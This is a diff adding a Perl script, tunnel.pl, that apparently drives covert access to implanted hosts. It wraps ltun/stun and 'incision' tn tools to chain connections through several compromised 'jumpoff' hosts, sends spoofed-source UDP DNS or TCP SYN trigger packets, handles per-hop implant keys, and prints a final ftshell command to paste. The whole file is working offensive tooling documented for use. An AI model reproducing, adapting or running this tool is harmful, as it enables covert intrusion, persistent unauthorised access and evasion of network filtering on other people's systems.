@@ -1,0 +1,521 @@
+#!/usr/bin/perl 
+
+#
+# $Log: tunnel.pl,v $
+# Added TCP SYN trigger support
+#
+# Change the use of the $uselocal option (-l of tn).  Use in all instances
+# of tunnel (tn), not just the first
+#
+# Added /sbin to environment path so that ifconfig can be found
+# Fixed bug when assigning defaultTunnelIp.  defaultIp was missing the $ reference
+#
+# The use local flags is only necessary when crafting the first tn command.
+#
+# Add tunnel perl script to repository.
+# Makefile target to make tunnel from tunnel.pl
+#
+
+=head1 NAME
+
+tunnel - A perl wrapper to {s|l}tun and tn for establishing an incision tunnel.
+
+=head1 SYNOPSIS
+
+B<tunnel> [-l] [-syn [port]] [-gIp <address>] [-gPort <port>] 
+[-localIp <address>] [-localPort <port>] 
+[-key <incision key id>] -tunnelIp <address> [-tunnelPort <port>] 
+-target <address> -target <address>
+
+Repeat the key, tunnelIp, tunnelPort and target sequence for each 
+tunnel you need to establish. Must be in tunnel sequence.
+
+B<tunnel> [-l] [-syn] [-gateway <ip[:port]>] [-local <ip[:port]>] 
+[-key <incision key id>] -tunnel <ip[:port]> -target <ip> -target <ip>
+
+Repeat the key and tunnel sequence for each tunnel you need to
+establish. Must be in tunnel sequence.
+
+B<tunnel> [-l] [-syn] [-keys <key id,...,key id>] 
+-tunnels <ip[:port],ip[:port],...> 
+-targets <target ip, target ip, ...>
+
+=head1 DESCRIPTION
+
+B<tunnel> will start the B<ltun> (for linux a linux) or B<stun> (for a solaris 
+host) incision tunnel program and read its output to generate the appropriate
+incision telnet (B<tn>)command string.  B<tunnel> will setup and initiate all
+but the last the last B<tn> command for any number of intermediary targets.
+The final B<tn> will be setup and displayed, but it is up to the user to
+run this final step.
+
+B<tunnel> supports 3 different forms for supplying arguements.  You may mix
+the usage, however, you may not combine like options.  For example; if you
+specify the B<-tunnelIp> argument, you cannot later use B<-tunnel>.  You must
+be consistent.
+
+B<tunnel> establishes a tunnel by creating an incision connection to a jumpoff
+host.  Multiple jumpoff points are supported.  This is accomplished by supplying
+additional key, tunnel address and target options for each jumpoff host.
+They must appear in the order that they will established.
+
+=head1 OPTIONS
+
+=over 12 
+
+=item C<-l>
+
+Creates the Incision trigger using the local IP address instead of a 
+spoofed address.  This is necessary when certain ISP's block outgoing packets
+containing spoofed addresses.  This is only necessary for the initial trigger
+packet when starting the pipe.
+
+=item C<-syn [port]>
+
+Send a TCP SYN tigger packet instead of the default UDP DNS tigger packet type.
+If a B<port> is supplied, this will be used for the B<final tn> command only.
+All other tiggers will use a randomly generated port.
+
+=item C<gIp address>
+
+=item C<gPort port>
+
+=item C<gateway ip:port >
+
+B<stun> and B<ltun> create a gateway tunnel on the local host.  -gIp and -gPort
+are the local host address and port.  Alternately the -gateway form can be used,
+but not at the same time as gIp or gPort. If unspecified, they default to 
+127.0.0.1 and some random value.  
+
+=item C<localIp address>
+
+=item C<localPort address>
+
+=item C<tunnel ip:port>
+
+tunnel is the combined form of localIp and localPort.  Use one or the other,
+but not both.  The first usage of tunnel will refer to the local host as 
+opposed to a jumpoff tunnel host.  (See below)
+localIp is the external address for the local host, usually the
+ppp or eth0 interface.  B<tunnel> will attempt to determine the external 
+interface and the address assigned to it.  The port for this interface will
+default to some random value.
+
+=item C<key incision_key>
+
+=item C<keys key, key, ...>
+
+Each jumpoff and the final target destination require an incision key.  The
+first form allows you to specify the first key for each jumpoff target.  
+Repeat its usage for each jumpoff and the final target.  The second form,
+keys, allows you to specify all the keys in a coma separated list, in order
+that they will be used.  If only a partial list is supplied, you will be
+prompted by tn for the key to use.
+
+=item C<tunnelIp address> 
+
+=item C<tunnelPort port>
+
+=item C<tunnel ip:port>
+
+=item C<tunnels ip:port, ip:port, ...>
+
+Again tunnel is the combined form of tunnelIp and tunnelPort.  The second 
+and subsequent appearance of tunnel specify the jumpoff hosts' "internal" 
+interface.  If port is unspecified or an '*', it defaults to some random value.
+If the ip address is '*', B<stun> and B<ltun> will report back a 0.0.0.0
+address for the internal interface.  B<tunnel> will then prompt for the
+required address.
+
+The fourth form, tunnels, allows you to specify all the ip addresses in
+order the tunnel will be established.  This form requires you to enter the
+local host localhost and external interface addresses, instead of allowing
+them to default.
+
+=item C<target ip>
+
+=item C<targets ip, ip, ...>
+
+target and targets specify the "external" address for each incision host.
+This is the address that you would use if you were to incision into each
+host directly using B<tn>.  targets simply allows you to specify them
+all together.
+
+=item C<verbose>
+
+The verbose flags allows you to see the outputs of B<stun>, B<ltun> and
+B<tn>.
+
+=back
+
+When setting up the tunnel, order is important.  You must specify the 
+keys, tunnels and target address and ports in order the tunnel will be
+established.  
+
+You should also have B<tn> and B<stun> or B<ltun> in your execution path.
+B<tunnel> will look there for these utilities.
+
+B<tunnel> begin by starting up B<stun> or B<ltun>, reading and parsing its
+output to generate the appropriate B<tn> commands.  Each jumpoff host will
+be established automatically.  The final B<tn> command will be printed to
+standard output with instructions on how to run it. B<tunnel> will not
+exit, until the final incision session has exited, or if there is a failure
+with connecting with any of the jumpoff hosts.
+
+Terminating B<tunnel> will also tear down the entire path to the target.
+
+=cut
+
+use Env;
+use Env qw(PATH);
+use FileHandle;
+use Getopt::Long;
+use Term::ReadLine;
+
+{
+package Gateway;
+local($ltun);
+local($ltun_pid);
+my($ltun_exe) = $^O eq "linux" ? ltun : stun;
+
+$ipIndex = 0;
+$portIndex = 1;
+
+sub Gateway::new {
+    shift;
+    my($gw) = shift;
+    my($listener) = shift;
+    my($verbose) = shift;
+
+    my($ip, $port) = split(/:/, $listener);
+    my($file) = "$ltun_exe @$gw[$ipIndex]:@$gw[$portIndex] $ip:$port";
+    $ltun = new FileHandle or return null;
+    $ltun_pid = $ltun->open("$file |") or return null;
+    print $file . "\n";
+    return bless {};
+}
+
+sub Gateway::read {
+    my($this) = shift;
+    my($verbose) = shift;
+    local($buf, $ltun_buf);
+
+    $buf = "";
+    $n = 0;
+    while (($n < 5) && ($_ = $ltun->sysread($ltun_buf, 80))) {
+	$buf .= $ltun_buf;
+	$n = split(/[\s+:]+/, $buf);
+    }
+
+    print "$ltun_exe ==> $buf\n" if $verbose;
+
+    return $buf;
+}
+
+sub Gateway::connection {
+    my($this) = shift;
+    my($verbose) = shift;
+
+    @stuff = split(/[\s+:]+/, $this->read($verbose));
+    shift @stuff;
+    return @stuff;
+}
+
+sub Gateway::stop {
+    kill 9, $ltun_pid;
+}
+
+sub Gateway::done {
+    return $ltun->close;
+}
+
+}
+
+{
+package Tunnel;
+
+local($tunnel);
+local($tunnel_pid);
+
+$verbose = 0;
+$defaultPort = "*";
+
+sub Tunnel::new {
+    shift;
+    my($uselocal) = shift;
+    my($synflag) = shift;
+    my($gw) = shift;
+    my($remote) = shift;
+    my($listener) = shift;
+    my($target) = shift;
+    my($key) = shift;
+
+    $trigtype = join ' ', "-s", int(rand 64512) if (defined($synflag));
+    ($ip, $port) = split(/:/, $listener);
+    $listener = join(':', $ip, $defaultPort) if (!defined($port));
+    
+    my($file) = "";
+    $file = "keys=$key " if defined($key);
+    $file .= "tn $uselocal $trigtype -g $gw -c $remote -t $listener $target";
+
+    $tunnel = new FileHandle or return;
+    $tunnel_pid = $tunnel->open("$file 2>&1 |") or return;
+    print $file . "\n";
+    return bless {};
+}
+
+sub Tunnel::check {
+    my($this, $verbose) = @_;
+    local($buf);
+
+    while ($tunnel->sysread($buf, 1024)) {
+	print $buf if $verbose;
+	return 1 if grep /cannot connect to tunnel/, $buf;
+    }
+    return 0;
+}
+
+sub Tunnel::stop {
+    kill 9, $tunnel_pid;
+}
+
+sub Tunnel::done {
+    return $tunnel->close;
+}
+
+}
+
+sub usage () {
+    local (@arg);
+    print "Usage:
+tunnel [-l] [-syn [port]] [-gIp <address>] [-gPort <port>] \
+	[-localIp <address>] [-localPort <port>] [-noInterface STR] \
+	-key <incision key id> -tunnelIp <address> [-tunnelPort <port>] \
+	-target <address>
+ 	Repeat the key, tunnelIp, tunnelPort and target sequence for each 
+	tunnel you need to establish. Must be in tunnel sequence.
+
+tunnel [-l] [-syn [port]] [-gateway <ip:port>] [-local <ip:port>] \
+       [-noInterface STR] \
+	-key <incision key id> -tunnel <ip:port> -target <ip>
+	Repeat the key and tunnel sequence for each tunnel you need to
+	establish. Must be in tunnel sequence.
+
+tunnel [-l] [-syn [port]] [-noInterface STR] -keys <key id,...,key id> 
+	-tunnels <ip:port,ip:port,...> \
+	-targets <target ip, target ip, ...>
+\n";
+}
+
+sub ifaddr {
+
+    return (split /[:\s+]+/, (`ifconfig @_ 2>&1`)[1])[3];
+}
+
+sub localIp {
+    local($if);
+    unless ($noInterface =~ /ppp/) {
+      return $if if defined($if = ifaddr ppp0);
+      return $if if defined($if = ifaddr ppp1);
+    }
+    unless ($noInterface =~ /eth0/) {
+      return $if if defined($if = ifaddr eth0);
+      return $if if defined($if = ifaddr eth1);
+    }
+    return;
+}
+
+die usage if !defined(@ARGV);
+
+$PATH .=":.:/sbin";	# If not already set, add . to search PATH env. var.
+
+$defaultPort = "*";
+$defaultIp = "*";
+$defaultGatewayIp = ifaddr lo;
+$defaultGatewayPort = $defaultPort;
+$defaultLocalPort = $defaultPort;
+$defaultTunnelIp = defaultIp;
+$defaultTunnelPort = $defaultPort;
+
+$gatewayIndex = 0;
+$ipIndex = 0;
+$portIndex = 1;
+$tunnelsIndex = 0;
+
+@opts = ("l!",		\$uselocal,
+	 "syn:i",	\$synflag,
+	 "verbose!",	\$verbose,
+	 "keys=s",	\$keys,
+	 "targets=s",	\$targets,
+	 "gateway=s",	\$gateway,
+	 "local=s",	\$local,
+	 "key=s",	\@keys,
+	 "tunnel=s",	\@tunnels,
+	 "target=s",	\@targets,
+	 "gIp=s",	\$gatewayIp,
+	 "gPort=s",	\$gatewayPort,
+	 "localIp=s",	\$localIp,
+	 "localPort=s",	\$localPort,
+	 "tunnelIp=s",	\@tunnelIps,
+	 "tunnelPort=s",	\@tunnelPorts,
+	 "tunnels=s",	\$tunnels,
+	 "help!", 	\$help,
+	 "noInterface=s", \$noInterface,
+);
+$result = GetOptions(@opts);
+die usage if (!$result || $help);
+
+if ( (defined($gatewayIp) || defined($gatewayPort)) &&
+     defined($gateway) ) {
+     die "specify either -gIp and -gPort, or -gateway, but not both\n";
+}
+
+if ( (defined($localIp) || defined($localPort)) &&
+     defined($local) ) {
+     die "specify either -localIp and -localPort, or -local, but not both\n";
+}
+
+if ( (defined(@tunnelIps) || defined($tunnelPorts)) &&
+     (defined(@tunnels) || defined($tunnels)) ) {
+     die "Don't mix usage of -tunnels, -tunnels, -tunnelIp and tunnelPort\n",
+	 "It just's makes it too complicated to figure out tunneling order\n";
+}
+
+if ( defined($targets) && defined(@targets) ) {
+     die "Don't mix usage of -target and -targets\n",
+	 "It just's makes it too complicated to figure out the order\n";
+}
+
+if ( !defined($targets) && !defined(@targets) ) {
+    die "Where're we going?  We need a final target destination\n" if usage;
+}
+
+if ( defined(@keys) && defined($keys) ) {
+     die "Don't mix usage of -key and -keys\n",
+	 "It just's makes it too complicated to figure out the order\n";
+}
+
+if ( $uselocal ) {
+    $uselocal="-l";
+}
+
+#if ( !defined(@keys) && !defined($keys) ) {
+#    die "Need to specify the incision key for each hop\n" if usage;
+#}
+
+if ( defined($keys) ) {
+    push @keys, split(/[,\s+ ]+/, $keys);
+}
+
+@gateway = ($defaultGatewayIp, $defaultGatewayPort);
+if (defined($gatewayIp) || defined($gatewayPort)) {
+    @gateway[$ipIndex] = $gatewayIp if defined($gatewayIp);
+    @gateway[$portIndex] = $gatewayPort if defined($gatewayPort);
+} elsif (defined($gateway) ) {
+    @gateway = split(/:/, $gateway);
+} 
+
+print "Using Gateway @gateway[$ipIndex]:@gateway[$portIndex]\n";
+
+if ( !(defined($localIp) && defined($local)) ) {
+    $defaultLocalIp = localIp();
+}
+
+$tmp = join(':',$defaultLocalIp, $defaultLocalPort);
+if (defined($localIp) || defined($localPort)) {
+    $tmp = join(':',defined($localIp) ? $localIp : $defaultLocalIp, 
+		    defined($localPort) ? $localPort: $defaultLocalPort);
+} elsif (defined($local) ) {
+    $tmp = $local;
+} 
+unshift @tunnels, $tmp;
+$tunnelsIndex++;
+print "Using local address ", @tunnels[$tunnelsIndex-1], "\n";
+
+if (defined($targets)) {
+    push @targets, split(/,\s+/, $targets);
+}
+
+if (defined($tunnels)) {
+    push @tunnels, split(/,\s+/, $tunnels);
+}
+
+if (defined(@tunnelIps)) {
+    for ($i = 0; $i <= $#tunnelIps && $i <= $#tunnelPorts; $i++) {
+	push @tunnels, join(':', @tunnelIps[$i], 
+				defined(@tunnelPorts) ? @tunnelPorts[$i] : 
+							$defaultTunnelPort);
+    }
+}
+
+# Start up gateway tunnel
+$tunnelsIndex = 0;
+($connectIP, $connectPort) = split(/:/, @tunnels[$tunnelsIndex]);
+$connectPort = $defaultPort if ($connectPort == null);
+print "Starting gateway:\n ";
+$ltun = new Gateway \@gateway, @tunnels[$tunnelsIndex], $verbose;
+STDOUT->autoflush(1);
+$|=1 ;
+($gatewayIP, $gatewayPort, $remoteIP, $remotePort) = $ltun->connection($verbose);
+$gateway = join(':', $gatewayIP, $gatewayPort);
+if ( (@gateway[$ipIndex] ne $gatewayIP) || 
+     ((@gateway[$portIndex] ne $defaultPort) && 
+      (@gateway[$portIndex] != $gatewayPort)) ) {
+    print "Gateway Ip address does not match what was supplied\n" if $verbose;
+    print "@gateway[$ipIndex]:@gateway[$portIndex] != $gateway\n" if $verbose;
+}
+
+$keyIndex=0;
+$Tunnel::verbose = $verbose;
+for ($i = $tunnelsIndex+1; $i <= $#tunnels; $i++) {
+
+    print "Starting tunnel ", $i-1,"\n ";
+    undef $key;
+    if (defined(@keys[$keyIndex])) {
+	$key = @keys[$keyIndex++];
+    }
+    $tunnel = new Tunnel $uselocal, $synflag, $gateway, join(':', $remoteIP, $remotePort), @tunnels[$i], @targets[$i-1], $key;
+    # Change use of uselocal.  Use for all instances not just the first
+    # undef $uselocal;	# don't need it after the first time. 
+    die if $tunnel->check($verbose | $i > $#keys+1);
+    $tunnel->done;
+
+    ($localIP, $localPort, $remoteIP, $remotePort) = $ltun->connection($verbose);
+    if ($remoteIP eq "0.0.0.0") {
+	local($term) = new Term::ReadLine $0;
+	local($prompt) = "Enter tunnel's listening IP address: ";
+	local($OUT) = $term->OUT || STDOUT;
+	warn "\nI need the Ip Address to establish the listening side of the tunnel for ",
+            "target = ", @targets[$i-1], ", key = ", @keys[$keyIndex-1], "\n";
+	undef $_;
+	while (!length) {
+	    if ( !defined($_ = $term->readline($prompt)) ) { 
+		$ltun->stop; 
+		exit; 
+	    }
+	}
+	$remoteIP = $_;
+    }
+
+}
+
+($connectIP, $connectPort) = split(/:/, @tunnels[$#tunnels]);
+$|=1 ;
+print "\nNow copy and paste the following line\n";
+print "\n\n";
+undef $file;
+$file = "keys=@keys[$keyIndex] " if defined(@keys[$keyIndex]);
+#$trigtype = join ' ', "-s", int(rand 64512) if (defined($synflag));
+
+if (defined $synflag) {
+	$trigtype = join ' ', "-s", $synflag;
+	$trigtype = join ' ', "-s", int(rand 64512) if ($synflag == 0);
+}
+
+$file .= "./ftshell ./tn $uselocal $trigtype -g $gateway -c $remoteIP:$remotePort -n @targets[$#targets] ";
+print $file, "\n\n";
+
+$ltun->read($verbose);
+
+print "$ltun_exe exited\n" if $ltun->done;
+
